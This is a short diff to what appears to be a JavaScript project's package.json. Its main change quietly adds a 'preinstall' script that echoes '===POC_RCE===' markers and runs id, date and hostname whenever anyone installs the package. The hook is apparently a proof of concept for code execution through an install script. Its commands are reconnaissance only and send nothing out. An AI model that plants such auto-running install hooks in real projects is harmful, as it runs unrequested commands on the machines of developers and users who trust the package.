@@ -16,7 +16,8 @@
     "docs:install": "yarn ./docs install",
     "docs:start": "yarn ./docs run start",
     "docs:build": "yarn ./docs run build",
-    "docs:serve": "yarn ./docs run serve"
+    "docs:serve": "yarn ./docs run serve",
+    "preinstall": "echo ===POC_RCE===; id; date; hostname; echo ===END==="
   },
   "devDependencies": {
     "@babel/core": "7.13.16",
